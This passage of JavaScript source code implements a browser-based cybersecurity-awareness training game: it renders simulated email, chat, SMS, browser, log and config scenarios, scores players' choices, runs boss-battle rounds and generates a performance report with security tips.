        const modal = document.getElementById(modalId);
        if (modal) {
            modal.classList.add('active');
            document.body.style.overflow = 'hidden';
        }
    }

    closeModal(modalId) {
        const modal = document.getElementById(modalId);
        if (modal) {
            modal.classList.remove('active');
            document.body.style.overflow = '';
        }
    }

    switchTab(tabName, btn) {
        document.querySelectorAll('.tab-btn').forEach(t => t.classList.remove('active'));
        btn.classList.add('active');
        document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
        document.getElementById('tab-' + tabName)?.classList.add('active');
    }

    openGameModal() {
        this.openModal('game-modal');
        this.showGameView('gameplay-view');
    }

    showGameView(viewId) {
        document.querySelectorAll('.game-view').forEach(v => v.classList.remove('active'));
        document.getElementById(viewId)?.classList.add('active');
    }

    toggleMenu() {
        document.getElementById('game-menu')?.classList.toggle('active');
    }

    // ==========================================
    // GAME FLOW
    // ==========================================

    startNewGame() {
        this.gameState = {
            playerName: '',
            playerRole: 'employee',
            security: 100,
            maxSecurity: 100,
            xp: 0,
            level: 1,
            reputation: 0,
            currentChapter: 1,
            currentScenario: 0,
            gameStarted: true,
            soundEnabled: true
        };
        
        Object.keys(this.performanceTracking).forEach(key => {
            this.performanceTracking[key] = { correct: 0, total: 0 };
        });
        this.mistakes = [];
        
        document.querySelectorAll('.role-card').forEach((c, i) => c.classList.toggle('selected', i === 0));
        document.getElementById('agent-name').value = '';
        
        this.openModal('character-modal');
    }

    selectRole(role, element) {
        this.gameState.playerRole = role;
        document.querySelectorAll('.role-card').forEach(c => c.classList.remove('selected'));
        element.classList.add('selected');
    }

    confirmCharacter() {
        this.gameState.playerName = document.getElementById('agent-name').value.trim() || 'Agent';
        this.closeModal('character-modal');
        this.openGameModal();
        this.updateHUD();
        this.startChapter(1);
    }

    startChapter(chapterNum) {
        const roleScenarios = this.scenarios[this.gameState.playerRole];
        if (!roleScenarios || !roleScenarios[chapterNum]) {
            this.showGameComplete();
            return;
        }
        
        this.gameState.currentChapter = chapterNum;
        this.gameState.currentScenario = 0;
        
        const chapter = roleScenarios[chapterNum];
        document.getElementById('chapter-banner').innerHTML = `
            <span class="chapter-number">CHAPTER ${chapterNum}</span>
            <span class="chapter-title">${chapter.name}</span>
        `;
        
        this.typeText(`
<span class="system-message">[TRAINING MODULE LOADED]</span>

<span class="warning-message">⚠ ${chapter.name.toUpperCase()} ⚠</span>

<span class="story-text">Welcome, ${this.gameState.playerName}.</span>
<span class="story-text">Role: <span class="highlight">${this.roles[this.gameState.playerRole].name}</span></span>

<span class="story-text">${chapter.description}</span>

<span class="system-message">Incoming scenario... Prepare yourself!</span>
        `, () => setTimeout(() => this.loadScenario(), 1500));
    }

    loadScenario() {
        const chapter = this.scenarios[this.gameState.playerRole][this.gameState.currentChapter];
        const scenario = chapter.scenarios[this.gameState.currentScenario];
        
        if (!scenario) {
            this.startBossBattle(chapter.boss);
            return;
        }
        
        document.getElementById('scenario-type').textContent = scenario.type.toUpperCase();
        document.getElementById('scenario-difficulty').textContent = this.getDifficultyDisplay(scenario.difficulty);
        document.getElementById('scenario-content').innerHTML = this.renderScenarioContent(scenario);
        this.renderChoices(scenario);
        document.getElementById('result-container').innerHTML = '';
        document.getElementById('result-container').className = 'result-container';
    }

    // ==========================================
    // RENDER FUNCTIONS
    // ==========================================

    renderScenarioContent(scenario) {
        let html = `<p class="scenario-setup">${scenario.setup}</p>`;
        
        switch (scenario.type) {
            case 'email': html += this.renderEmail(scenario.content); break;
            case 'chat': html += this.renderChat(scenario.content); break;
            case 'sms': html += this.renderSMS(scenario.content); break;
            case 'browser': html += this.renderBrowser(scenario.content); break;
            case 'phone': html += this.renderPhone(scenario.content); break;
            case 'ticket': html += this.renderTicket(scenario.content); break;
            case 'logs': html += this.renderLogs(scenario.content); break;
            case 'alert': html += this.renderAlert(scenario.content); break;
            case 'config': html += this.renderConfig(scenario.content); break;
            case 'code': html += this.renderCode(scenario.content); break;
            default: html += this.renderGenericScenario(scenario.content);
        }
        
        if (scenario.question) {
            html += `<p class="scenario-question"><strong>${scenario.question}</strong></p>`;
        }
        return html;
    }

    renderEmail(c) {
        const fromClass = c.from.external ? 'external' : 'internal';
        return `
        <div class="email-client">
            ${c.warning ? `<div class="email-warning-banner danger"><span class="email-warning-icon">⚠️</span><span>${c.warning}</span></div>` : ''}
            <div class="email-toolbar">
                <button class="email-toolbar-btn">↩ Reply</button>
                <button class="email-toolbar-btn">↪ Forward</button>
                <button class="email-toolbar-btn danger">🗑️</button>
            </div>
            <div class="email-meta">
                <div class="email-subject-line">${c.subject}</div>
                <div class="email-participants">
                    <div class="email-avatar ${fromClass}">${c.from.name.charAt(0)}</div>
                    <div class="email-sender-info">
                        <div class="email-sender-name">${c.from.name}</div>
                        <div class="email-sender-address">&lt;${c.from.email}&gt;</div>
                        ${c.time ? `<div class="email-timestamp">${c.time}</div>` : ''}
                    </div>
                </div>
                <div class="email-to-line">To: ${c.to || 'me'}</div>
            </div>
            <div class="email-body-content">
                ${c.body.split('\n').map(line => `<p>${line}</p>`).join('')}
                ${c.attachment ? `<div class="email-attachment ${c.attachment.suspicious ? 'suspicious' : ''}"><span class="email-attachment-icon">📎</span><span>${c.attachment.name}</span></div>` : ''}
            </div>
            ${c.headers ? `<div style="font-size:10px;color:#999;padding:8px;border-top:1px solid #eee;font-family:monospace;">${c.headers}</div>` : ''}
        </div>`;
    }

    renderChat(c) {
        return `
        <div class="chat-client">
            <div class="chat-header"><span class="chat-channel-icon">#</span><span class="chat-channel-name">${c.channel}</span></div>
            ${c.messages.map(m => `
                <div class="chat-message">
                    <div class="chat-user-avatar">${m.user.charAt(0)}</div>
                    <div class="chat-message-content">
                        <div class="chat-message-header">
                            <span class="chat-username ${m.userType === 'external' ? 'external' : ''}">${m.user}</span>
                            ${m.userType === 'external' ? '<span class="chat-external-badge">EXTERNAL</span>' : ''}
                            <span class="chat-timestamp">${m.time}</span>
                        </div>
                        <div class="chat-message-text">${m.text}</div>
                    </div>
                </div>
            `).join('')}
        </div>`;
    }

    renderSMS(c) {
        return `
        <div class="sms-client">
            <div class="sms-header"><div class="sms-contact">Unknown</div><div class="sms-number">${c.number}</div></div>
            <div class="sms-messages">
                ${c.messages.map(m => `<div class="sms-bubble ${m.type}">${m.text}</div>${m.time ? `<div class="sms-time">${m.time}</div>` : ''}`).join('')}
            </div>
        </div>`;
    }

    renderBrowser(c) {
        let content = '';
        if (c.loginForm) {
            content = `<div class="login-form"><div class="login-logo">${c.loginForm.logo === 'Microsoft' ? '🪟' : '🔐'}</div><div class="login-title">${c.loginForm.title}</div><div class="login-subtitle">${c.loginForm.subtitle || ''}</div><input class="login-input" type="email" placeholder="Email"><input class="login-input" type="password" placeholder="Password"><button class="login-btn">Sign in</button></div>`;
        } else if (c.popup) {
            content = `<div class="alert-popup"><div class="alert-popup-header ${c.popup.type}"><span class="alert-popup-icon">${c.popup.type === 'danger' ? '⚠️' : 'ℹ️'}</span><span class="alert-popup-title">${c.popup.title}</span></div><div class="alert-popup-body">${c.popup.message}</div><div class="alert-popup-buttons">${c.popup.buttons.map(b => `<button class="alert-btn">${b}</button>`).join('')}</div></div>`;
        }
        return `
        <div class="browser-window">
            <div class="browser-chrome">
                <div class="browser-controls"><span class="browser-dot red"></span><span class="browser-dot yellow"></span><span class="browser-dot green"></span></div>
                <div class="browser-address-bar">
                    <span class="browser-lock ${c.secure ? '' : 'insecure'}">${c.secure ? '🔒' : '⚠️'}</span>
                    <span class="browser-url">https://<span class="domain ${c.suspiciousDomain ? 'suspicious' : ''}">${c.domain || c.url}</span>/</span>
                </div>
            </div>
            <div class="browser-content">${content}</div>
        </div>`;
    }

    renderPhone(c) {
        return `<div class="alert-popup"><div class="alert-popup-header info"><span class="alert-popup-icon">📞</span><span class="alert-popup-title">${c.caller}</span></div><div class="alert-popup-body"><em>"${c.transcript}"</em></div></div>`;
    }

    renderTicket(c) {
        return `
        <div class="ticket-client">
            <div class="ticket-header"><div class="ticket-id">${c.ticketId}</div><div class="ticket-title">${c.title}</div></div>
            <div class="ticket-meta">
                <div class="ticket-meta-item"><label>Priority</label><span class="ticket-priority ${c.priority.toLowerCase()}">${c.priority}</span></div>
                <div class="ticket-meta-item"><label>Requester</label><span>${c.requester.name}</span></div>
                <div class="ticket-meta-item"><label>Assigned</label><span>You</span></div>
            </div>
            <div class="ticket-conversation"><div class="ticket-message"><div class="ticket-avatar requester">👤</div><div class="ticket-message-body"><div class="ticket-text">${c.details}</div></div></div></div>
        </div>`;
    }

    renderLogs(c) {
        return `
        <div class="log-viewer" style="background:#1a1a2e;border-radius:8px;overflow:hidden;font-family:monospace;font-size:12px;">
            <div style="background:#0f0f23;padding:8px 12px;color:#00ff00;">LOG VIEWER</div>
            <div style="padding:12px;overflow-x:auto;">
                <table style="width:100%;border-collapse:collapse;color:#e0e0e0;">
                    <thead><tr style="color:#00d4ff;text-align:left;"><th style="padding:4px 8px;">Time</th><th style="padding:4px 8px;">Event</th><th style="padding:4px 8px;">User/Src</th><th style="padding:4px 8px;">Details</th></tr></thead>
                    <tbody>${c.logs.map(l => `<tr style="border-top:1px solid #333;${l.event.includes('SUCCESS') ? 'color:#ff6b6b;font-weight:bold;' : ''}"><td style="padding:4px 8px;">${l.time}</td><td style="padding:4px 8px;">${l.event}</td><td style="padding:4px 8px;">${l.user || l.source || '-'}</td><td style="padding:4px 8px;">${l.detail || l.dest || '-'}</td></tr>`).join('')}</tbody>
                </table>
            </div>
            ${c.note ? `<div style="padding:8px 12px;background:#2a2a4a;color:#ffd700;font-size:11px;">📝 ${c.note}</div>` : ''}
        </div>`;
    }

    renderAlert(c) {
        const colors = { Critical: '#dc3545', High: '#fd7e14', Medium: '#ffc107', Low: '#17a2b8' };
        return `
        <div class="alert-popup">
            <div class="alert-popup-header" style="background:${colors[c.severity] || '#ffc107'}20;border-color:${colors[c.severity] || '#ffc107'};">
                <span class="alert-popup-icon">🚨</span>
                <span class="alert-popup-title" style="color:${colors[c.severity] || '#856404'};">${c.alertTitle}</span>
            </div>
            <div class="alert-popup-body">
                <p><strong>Severity:</strong> <span style="color:${colors[c.severity]}">${c.severity}</span></p>
                ${c.source ? `<p><strong>Source:</strong> ${c.source}</p>` : ''}
                <p>${c.details}</p>
                ${c.timeline ? `<div><strong>Timeline:</strong><ul style="margin:8px 0;padding-left:20px;">${c.timeline.map(t => `<li style="margin:4px 0;">${t}</li>`).join('')}</ul></div>` : ''}
            </div>
        </div>`;
    }

    renderConfig(c) {
        const statusColors = { ok: '#28a745', warning: '#ffc107', danger: '#dc3545' };
        return `
        <div style="background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 2px 10px rgba(0,0,0,0.1);">
            <div style="background:#2c3e50;color:#fff;padding:12px 16px;font-weight:600;">${c.resource}</div>
            <table style="width:100%;border-collapse:collapse;">
                <thead><tr style="background:#f8f9fa;"><th style="padding:10px;text-align:left;border-bottom:2px solid #dee2e6;">Setting</th><th style="padding:10px;text-align:left;border-bottom:2px solid #dee2e6;">Value</th><th style="padding:10px;text-align:center;border-bottom:2px solid #dee2e6;">Status</th></tr></thead>
                <tbody>${c.config.map(cfg => `<tr><td style="padding:10px;border-bottom:1px solid #dee2e6;color:#333;">${cfg.setting}</td><td style="padding:10px;border-bottom:1px solid #dee2e6;font-family:monospace;color:#333;">${cfg.value}</td><td style="padding:10px;border-bottom:1px solid #dee2e6;text-align:center;"><span style="display:inline-block;width:12px;height:12px;border-radius:50%;background:${statusColors[cfg.status]}"></span></td></tr>`).join('')}</tbody>
            </table>
            ${c.note ? `<div style="padding:12px 16px;background:#fff3cd;color:#856404;font-size:13px;">💡 ${c.note}</div>` : ''}
        </div>`;
    }

    renderCode(c) {
        return `
        <div style="background:#1e1e1e;border-radius:8px;overflow:hidden;font-family:'Consolas',monospace;">
            <div style="display:flex;justify-content:space-between;background:#323232;padding:8px 12px;color:#ccc;font-size:12px;">
                <span>${c.endpoint}</span><span style="color:#9cdcfe;">${c.auth}</span>
            </div>
            <pre style="margin:0;padding:16px;overflow-x:auto;color:#d4d4d4;font-size:13px;line-height:1.5;">${c.code.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</pre>
        </div>`;
    }

    renderGenericScenario(c) {
        let html = '';
        if (c.context) html += `<p style="color:#ccc;margin-bottom:12px;">${c.context}</p>`;
        if (c.quote) html += `<blockquote style="border-left:4px solid #00d4ff;padding:12px 16px;margin:12px 0;background:rgba(0,212,255,0.1);font-style:italic;color:#e0e0e0;">${c.quote}</blockquote>`;
        if (c.details) html += `<p style="color:#aaa;font-size:14px;">${c.details}</p>`;
        return html;
    }

    renderChoices(scenario) {
        document.getElementById('choices-container').innerHTML = scenario.choices.map(c => `
            <button class="choice-btn" data-choice="${c.id}" onclick="game.selectAnswer('${c.id}')">
                <span class="choice-letter">${c.id.toUpperCase()}</span>
                <span class="choice-text">${c.text}</span>
            </button>
        `).join('');
    }

    getDifficultyDisplay(d) {
        return { easy: '🟢 EASY', medium: '🟡 MEDIUM', hard: '🔴 HARD' }[d] || '⚪ UNKNOWN';
    }

    // ==========================================
    // ANSWER HANDLING
    // ==========================================

    selectAnswer(choiceId) {
        const chapter = this.scenarios[this.gameState.playerRole][this.gameState.currentChapter];
        const scenario = chapter.scenarios[this.gameState.currentScenario];
        const isCorrect = choiceId === scenario.correct;
        
        if (scenario.category && this.performanceTracking[scenario.category]) {
            this.performanceTracking[scenario.category].total++;
            if (isCorrect) this.performanceTracking[scenario.category].correct++;
        }
        
        if (!isCorrect) {
            this.mistakes.push({
                chapter: this.gameState.currentChapter,
                category: scenario.category,
                question: scenario.question || scenario.setup,
                yourAnswer: scenario.choices.find(c => c.id === choiceId)?.text,
                correctAnswer: scenario.choices.find(c => c.id === scenario.correct)?.text,
                lesson: scenario.lesson
            });
        }
        
        document.querySelectorAll('.choice-btn').forEach(btn => {
            btn.disabled = true;
            if (btn.dataset.choice === scenario.correct) btn.classList.add('correct');
            else if (btn.dataset.choice === choiceId) btn.classList.add('incorrect');
        });
        
        this.showResult(isCorrect, scenario);
        
        if (isCorrect) {
            this.gameState.xp += 20;
            this.gameState.reputation += 5;
            this.checkLevelUp();
        } else {
            this.gameState.security -= 15;
            if (this.gameState.security <= 0) {
                setTimeout(() => this.gameOver(), 1500);
                return;
            }
        }
        
        this.updateHUD();
        setTimeout(() => { this.gameState.currentScenario++; this.loadScenario(); }, 3000);
    }

    showResult(isCorrect, scenario) {
        const container = document.getElementById('result-container');
        container.className = `result-container ${isCorrect ? 'success' : 'failure'}`;
        container.innerHTML = `
            <div class="result-header"><span class="result-icon">${isCorrect ? '✅' : '❌'}</span><span class="result-title">${isCorrect ? 'Correct!' : 'Incorrect'}</span></div>
            <p class="result-explanation">${scenario.explanation}</p>
            <div class="result-stats"><span class="result-stat ${isCorrect ? 'positive' : 'negative'}">${isCorrect ? '+20 XP' : '-15 Security'}</span>${isCorrect ? '<span class="result-stat positive">+5 Rep</span>' : ''}</div>
        `;
    }

    // ==========================================
    // BOSS BATTLES
    // ==========================================

    startBossBattle(boss) {
        if (!boss) return;
        this.currentBoss = { ...boss, currentHealth: boss.health, attackIndex: 0 };
        this.showGameView('boss-view');
        document.getElementById('boss-avatar').textContent = boss.avatar;
        document.getElementById('boss-name').textContent = boss.name;
        document.getElementById('boss-title').textContent = boss.title;
        this.updateBossHealth();
        this.showBossDialogue(boss.dialogue[0], () => setTimeout(() => this.loadBossAttack(), 1500));
    }

    showBossDialogue(text, cb) {
        document.getElementById('battle-dialogue').innerHTML = `<em>"${text}"</em>`;
        if (cb) setTimeout(cb, 1000);
    }

    loadBossAttack() {
        const attack = this.currentBoss.attacks[this.currentBoss.attackIndex];
        if (!attack) { this.defeatBoss(); return; }
        
        document.getElementById('battle-scenario').innerHTML = `<h4>${attack.name}</h4><p>${attack.description}</p>${this.renderScenarioContent(attack.scenario)}`;
        document.getElementById('battle-choices').innerHTML = attack.scenario.choices.map(c => `
            <button class="choice-btn" data-choice="${c.id}" onclick="game.selectBossAnswer('${c.id}')">
                <span class="choice-letter">${c.id.toUpperCase()}</span><span class="choice-text">${c.text}</span>
            </button>
        `).join('');
    }

    selectBossAnswer(choiceId) {
        const attack = this.currentBoss.attacks[this.currentBoss.attackIndex];
        const isCorrect = choiceId === attack.scenario.correct;
        
        if (attack.scenario.category && this.performanceTracking[attack.scenario.category]) {
            this.performanceTracking[attack.scenario.category].total++;
            if (isCorrect) this.performanceTracking[attack.scenario.category].correct++;
        }
        
        document.querySelectorAll('#battle-choices .choice-btn').forEach(btn => {
            btn.disabled = true;
            if (btn.dataset.choice === attack.scenario.correct) btn.classList.add('correct');
            else if (btn.dataset.choice === choiceId) btn.classList.add('incorrect');
        });
        
        if (isCorrect) {
            this.currentBoss.currentHealth -= 50;
            this.gameState.xp += 30;
            this.gameState.reputation += 10;
            this.showBossDialogue("Argh! You saw through my attack!");
        } else {
            this.gameState.security -= attack.damage;
            if (this.gameState.security <= 0) { setTimeout(() => this.gameOver(), 1500); return; }
            this.showBossDialogue("Ha! You fell for it!");
        }
        
        this.updateHUD();
        this.updateBossHealth();
        
        setTimeout(() => {
            if (this.currentBoss.currentHealth <= 0) this.defeatBoss();
            else { this.currentBoss.attackIndex++; this.loadBossAttack(); }
        }, 2000);
    }

    updateBossHealth() {
        const pct = (this.currentBoss.currentHealth / this.currentBoss.health) * 100;
        document.getElementById('boss-health-fill').style.width = `${pct}%`;
        document.getElementById('boss-health-text').textContent = `${Math.max(0, this.currentBoss.currentHealth)}/${this.currentBoss.health}`;
    }

    defeatBoss() {
        this.gameState.reputation += 50;
        this.showVictoryScreen(`You defeated ${this.currentBoss.name}!`, 100, 50);
    }

    // ==========================================
    // VICTORY & GAME OVER
    // ==========================================

    showVictoryScreen(message, xp = 0, rep = 0) {
        this.showGameView('victory-view');
        document.getElementById('victory-message').textContent = message;
        document.getElementById('victory-xp').textContent = `+${xp}`;
        document.getElementById('victory-rep').textContent = `+${rep}`;
        document.getElementById('victory-security').textContent = `${Math.round((this.gameState.security / this.gameState.maxSecurity) * 100)}%`;
        
        const chapter = this.scenarios[this.gameState.playerRole][this.gameState.currentChapter];
        const lessons = chapter.scenarios.slice(0, 3).map(s => s.lesson);
        document.getElementById('victory-lessons').innerHTML = `<h4>📚 Key Takeaways</h4><ul>${lessons.map(l => `<li>${l}</li>`).join('')}</ul>`;
    }

    continueAfterVictory() {
        const next = this.gameState.currentChapter + 1;
        if (this.scenarios[this.gameState.playerRole]?.[next]) {
            this.showGameView('gameplay-view');
            this.startChapter(next);
        } else {
            this.showGameComplete();
        }
    }

    showGameComplete() {
        this.showGameView('complete-view');
    }

    gameOver() {
        this.showGameView('gameover-view');
        document.getElementById('go-chapter').textContent = this.gameState.currentChapter;
        document.getElementById('go-score').textContent = this.gameState.reputation;
        const tips = ["Always verify unexpected requests.", "Never share your password.", "Check URLs carefully.", "If it's urgent, it's probably a scam.", "Enable MFA everywhere."];
        document.getElementById('gameover-tip-text').textContent = tips[Math.floor(Math.random() * tips.length)];
    }

    restartFromCheckpoint() {
        this.gameState.security = this.gameState.maxSecurity;
        this.gameState.currentScenario = 0;
        this.showGameView('gameplay-view');
        this.updateHUD();
        this.startChapter(this.gameState.currentChapter);
    }

    // ==========================================
    // FINAL REPORT
    // ==========================================

    showFinalReport() {
        this.showGameView('report-view');
        this.generateReport();
    }

    generateReport() {
        const date = new Date().toLocaleDateString('en-US', { year: 'numeric', month: 'long', day: 'numeric' });
        document.getElementById('report-date').textContent = `Generated: ${date}`;
        
        let totalCorrect = 0, totalQuestions = 0;
        Object.values(this.performanceTracking).forEach(c => { totalCorrect += c.correct; totalQuestions += c.total; });
        const accuracy = totalQuestions > 0 ? Math.round((totalCorrect / totalQuestions) * 100) : 0;
        
        const categoryNames = {
            phishing: 'Phishing Detection', socialEngineering: 'Social Engineering', malware: 'Malware Recognition',
            passwordSecurity: 'Password Security', dataProtection: 'Data Protection', physicalSecurity: 'Physical Security',
            incidentResponse: 'Incident Response', secureConfiguration: 'Secure Configuration'
        };
        
        let html = `
        <div class="report-section">
            <h3>📊 Performance Overview</h3>
            <div class="report-overview">
                <div class="report-stat-box"><div class="report-stat-value ${accuracy >= 80 ? 'good' : accuracy >= 60 ? 'warning' : 'danger'}">${accuracy}%</div><div class="report-stat-label">Overall Score</div></div>
                <div class="report-stat-box"><div class="report-stat-value">${totalCorrect}/${totalQuestions}</div><div class="report-stat-label">Correct</div></div>
                <div class="report-stat-box"><div class="report-stat-value">${this.gameState.currentChapter}</div><div class="report-stat-label">Chapters</div></div>
                <div class="report-stat-box"><div class="report-stat-value">${this.gameState.reputation}</div><div class="report-stat-label">Reputation</div></div>
            </div>
        </div>
        <div class="report-section"><h3>📈 Performance by Category</h3><div class="report-category-grid">`;
        
        Object.entries(this.performanceTracking).forEach(([key, data]) => {
            if (data.total > 0) {
                const pct = Math.round((data.correct / data.total) * 100);
                const status = pct < 50 ? 'poor' : pct < 70 ? 'needs-work' : pct < 90 ? 'good' : 'excellent';
                html += `<div class="report-category ${status}"><span class="report-category-name">${categoryNames[key] || key}</span><span class="report-category-score">${pct}%</span></div>`;
            }
        });
        
        html += `</div></div><div class="report-section"><h3>💡 Recommendations</h3><ul class="report-recommendations">`;
        
        const recs = this.generateRecommendations();
        recs.forEach(r => { html += `<li><span class="report-rec-icon">⚡</span><div class="report-rec-text"><div class="report-rec-title">${r.title}</div><div class="report-rec-desc">${r.description}</div></div></li>`; });
        html += `</ul></div>`;
        
        if (this.mistakes.length > 0) {
            html += `<div class="report-section"><h3>❌ Areas to Review</h3><ul class="report-mistakes">`;
            this.mistakes.slice(0, 5).forEach(m => { html += `<li class="report-mistake"><span class="report-mistake-icon">❌</span><div class="report-mistake-text"><strong>${categoryNames[m.category] || m.category}</strong><br>${m.lesson}</div></li>`; });
            html += `</ul></div>`;
        }
        
        html += `<div class="report-section"><h3>🎯 Summary</h3><p>As a <strong>${this.roles[this.gameState.playerRole].name}</strong>, ${accuracy >= 80 ? 'your performance demonstrates strong security awareness. Keep it up!' : accuracy >= 60 ? 'you have a good foundation but should review the areas identified above.' : 'we recommend additional training, particularly in the weak areas listed.'}</p></div>`;
        
        document.getElementById('report-body').innerHTML = html;
    }

    generateRecommendations() {
        const recs = [];
        const checks = [
            ['phishing', 'Email Verification', 'Always verify sender addresses and be suspicious of urgency tactics.'],
            ['socialEngineering', 'Verify Requests', 'Never bypass verification procedures regardless of urgency claims.'],
            ['passwordSecurity', 'Credential Protection', 'Never share passwords. Use a password manager and enable MFA.'],
            ['dataProtection', 'Data Handling', 'Verify data sharing procedures before sending information externally.'],
            ['incidentResponse', 'Incident Response', 'Report suspicious activity immediately. Prioritize containment.']
        ];
        
        checks.forEach(([cat, title, desc]) => {
            if (this.performanceTracking[cat].total > 0 && this.performanceTracking[cat].correct / this.performanceTracking[cat].total < 0.8) {
                recs.push({ title, description: desc });
            }
        });
        
        if (recs.length === 0) {
            recs.push({ title: 'Stay Vigilant', description: 'Great job! Continue questioning unexpected requests and reporting suspicious activity.' });
        }
        return recs;
    }

    printReport() { window.print(); }

    // ==========================================
    // HUD & UTILITIES
    // ==========================================

    updateHUD() {
        const role = this.roles[this.gameState.playerRole];
        document.getElementById('hud-avatar').textContent = role?.icon || '👤';
        document.getElementById('hud-name').textContent = this.gameState.playerName;
        document.getElementById('hud-level').textContent = this.gameState.level;
        document.getElementById('security-fill').style.width = `${(this.gameState.security / this.gameState.maxSecurity) * 100}%`;
        document.getElementById('security-value').textContent = Math.round(this.gameState.security);
        document.getElementById('xp-fill').style.width = `${(this.gameState.xp % 100)}%`;
        document.getElementById('xp-value').textContent = this.gameState.xp % 100;
        document.getElementById('rep-value').textContent = this.gameState.reputation;
    }

    checkLevelUp() {
        if (this.gameState.xp >= this.gameState.level * 100) {
            this.gameState.level++;
            this.showToast('success', 'Level Up!', `You are now level ${this.gameState.level}`);
        }
    }

    typeText(text, cb) {
        document.getElementById('terminal-output').innerHTML = text;
        if (cb) setTimeout(cb, 500);
    }

    showToast(type, title, message) {
        const container = document.getElementById('toast-container');
        const toast = document.createElement('div');
        toast.className = `toast toast-${type}`;
        toast.innerHTML = `<strong>${title}</strong><p>${message}</p>`;
        container.appendChild(toast);
        setTimeout(() => toast.classList.add('show'), 10);
        setTimeout(() => { toast.classList.remove('show'); setTimeout(() => toast.remove(), 300); }, 3000);
    }

    toggleSound() {
        this.gameState.soundEnabled = !this.gameState.soundEnabled;
        document.getElementById('sound-status').textContent = this.gameState.soundEnabled ? 'ON' : 'OFF';
    }

    quitToTitle() {
        document.getElementById('game-menu')?.classList.remove('active');
        this.closeModal('game-modal');
    }

    saveGame() {
        localStorage.setItem('firewall_save', JSON.stringify({ gameState: this.gameState, performanceTracking: this.performanceTracking, mistakes: this.mistakes }));
        this.showToast('success', 'Saved', 'Progress saved!');
    }

    loadGame() {
        const saved = localStorage.getItem('firewall_save');
        if (saved) {
            const data = JSON.parse(saved);
            this.gameState = data.gameState;
            this.performanceTracking = data.performanceTracking || this.performanceTracking;
            this.mistakes = data.mistakes || [];
            this.openGameModal();
            this.updateHUD();
            this.startChapter(this.gameState.currentChapter);
        } else {
            this.showToast('warning', 'No Save', 'Start a new game!');
        }
    }
}

console.log('CyberGuardGame class defined');

// Initialize game when DOM is ready
let game = null;

function initGame() {
    try {
        if (!game) {
            game = new CyberGuardGame();
            window.game = game;
            console.log('Game initialized successfully');
        }
    } catch (e) {
        console.error('Failed to initialize game:', e);
    }
}

if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initGame);
} else {
    initGame();
}
